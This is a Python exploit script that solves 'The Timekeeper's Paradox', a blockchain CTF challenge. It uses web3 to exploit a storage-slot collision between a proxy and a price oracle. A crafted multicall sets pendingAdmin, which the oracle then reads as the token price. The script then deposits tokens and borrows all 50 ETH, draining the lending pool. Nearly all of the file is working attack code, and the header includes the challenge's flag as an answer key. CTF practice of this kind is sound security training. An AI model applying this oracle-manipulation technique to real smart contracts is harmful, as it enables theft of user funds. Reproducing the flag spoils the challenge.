#!/usr/bin/env python3
"""
The Timekeeper's Paradox - Automated Exploit Script
Category: Blockchain / Smart Contracts
Points: 331 / 244
Flag: COMPFEST18{t1m3k33p3r_pr1c3_0r4cl3_m4n1p_v14_st0r4g3_c0ll1s10n_le4k3dddddd_n0000000}
"""

from web3 import Web3
import requests, json, os, sys

base_url = sys.argv[1] if len(sys.argv) > 1 else os.environ.get("CHALLENGE_URL")
if not base_url:
    raise SystemExit("usage: solve.py CHALLENGE_URL")
base_url = base_url.rstrip("/")
s = requests.Session()

print("[*] Launching challenge instance...")
r = s.post(f"{base_url}/launch")
data = r.json()

rpc_url = data["0"]["RPC_URL"].replace("{ORIGIN}", base_url)
privkey = data["1"]["PRIVKEY"]
setup_addr = Web3.to_checksum_address(data["2"]["SETUP_CONTRACT_ADDR"])
wallet_addr = Web3.to_checksum_address(data["3"]["WALLET_ADDR"])

print(f"[+] RPC: {rpc_url}")
print(f"[+] Setup: {setup_addr}")
print(f"[+] Wallet: {wallet_addr}")

w3 = Web3(Web3.HTTPProvider(rpc_url))
account = w3.eth.account.from_key(privkey)

def query_addr(sig_text):
    sig = w3.keccak(text=sig_text)[:4]
    res = w3.eth.call({"to": setup_addr, "data": sig})
    return Web3.to_checksum_address("0x" + res.hex()[-40:])

token_addr = query_addr("token()")
oracle_addr = query_addr("oracle()")
proxy_addr = query_addr("proxy()")
lending_addr = query_addr("lending()")

print(f"[+] Token: {token_addr}")
print(f"[+] Proxy: {proxy_addr}")
print(f"[+] Lending: {lending_addr}")
print(f"[+] Lending ETH balance: {w3.from_wei(w3.eth.get_balance(lending_addr), 'ether')} ETH")

# Step 1: Multicall on proxy to set pendingAdmin to address(1) via msg.sender == address(this)
# In TimekeeperOracle, slot 2 is `latestPrice`.
# In TimekeeperProxy, slot 2 is `pendingAdmin`.
# When proxy delegates getLatestPrice() to oracle, it reads slot 2 (pendingAdmin).
multicall_sel = w3.keccak(text="multicall(bytes[])")[:4]
set_pending_sel = w3.keccak(text="setPendingAdmin(address)")[:4]

inner_call = set_pending_sel + bytes.fromhex("1".zfill(64))
inner_padded = inner_call.ljust(64, b"\x00")

multicall_data = multicall_sel + (
    (32).to_bytes(32, "big") +
    (1).to_bytes(32, "big") +
    (32).to_bytes(32, "big") +
    (len(inner_call)).to_bytes(32, "big") +
    inner_padded
)

tx1 = {
    "to": proxy_addr,
    "data": "0x" + multicall_data.hex(),
    "gas": 300000,
    "gasPrice": w3.eth.gas_price,
    "nonce": w3.eth.get_transaction_count(account.address),
    "chainId": w3.eth.chain_id,
}
s1 = account.sign_transaction(tx1)
r1 = w3.eth.wait_for_transaction_receipt(w3.eth.send_raw_transaction(s1.raw_transaction))
print(f"[+] Multicall setPendingAdmin tx status: {r1.status}")

# Step 2: Approve token to lending pool
approve_sel = w3.keccak(text="approve(address,uint256)")[:4]
approve_data = approve_sel + bytes.fromhex(lending_addr[2:].zfill(64)) + ((1 << 256) - 1).to_bytes(32, "big")

tx2 = {
    "to": token_addr,
    "data": "0x" + approve_data.hex(),
    "gas": 100000,
    "gasPrice": w3.eth.gas_price,
    "nonce": w3.eth.get_transaction_count(account.address),
    "chainId": w3.eth.chain_id,
}
s2 = account.sign_transaction(tx2)
r2 = w3.eth.wait_for_transaction_receipt(w3.eth.send_raw_transaction(s2.raw_transaction))
print(f"[+] Token approve tx status: {r2.status}")

# Step 3: Deposit 10,000 TKG tokens
deposit_sel = w3.keccak(text="depositToken(uint256)")[:4]
deposit_data = deposit_sel + (10_000 * 10**18).to_bytes(32, "big")

tx3 = {
    "to": lending_addr,
    "data": "0x" + deposit_data.hex(),
    "gas": 200000,
    "gasPrice": w3.eth.gas_price,
    "nonce": w3.eth.get_transaction_count(account.address),
    "chainId": w3.eth.chain_id,
}
s3 = account.sign_transaction(tx3)
r3 = w3.eth.wait_for_transaction_receipt(w3.eth.send_raw_transaction(s3.raw_transaction))
print(f"[+] Deposit token tx status: {r3.status}")

# Step 4: Borrow all 50 ETH
borrow_sel = w3.keccak(text="borrowETH(uint256)")[:4]
borrow_data = borrow_sel + (50 * 10**18).to_bytes(32, "big")

tx4 = {
    "to": lending_addr,
    "data": "0x" + borrow_data.hex(),
    "gas": 300000,
    "gasPrice": w3.eth.gas_price,
    "nonce": w3.eth.get_transaction_count(account.address),
    "chainId": w3.eth.chain_id,
}
s4 = account.sign_transaction(tx4)
r4 = w3.eth.wait_for_transaction_receipt(w3.eth.send_raw_transaction(s4.raw_transaction))
print(f"[+] Borrow 50 ETH tx status: {r4.status}")

# Step 5: Check lending pool drained and get flag
lending_bal = w3.eth.get_balance(lending_addr)
print(f"[+] Lending pool balance: {lending_bal} wei")

is_solved_sel = w3.keccak(text="isSolved()")[:4]
is_solved = bool(int.from_bytes(w3.eth.call({"to": setup_addr, "data": is_solved_sel}), "big"))
print(f"[+] isSolved(): {is_solved}")

flag_resp = s.get(f"{base_url}/flag")
flag_data = flag_resp.json()
print(f"\n[+] FLAG: {flag_data.get('flag')}")

if __name__ == "__main__":
    pass
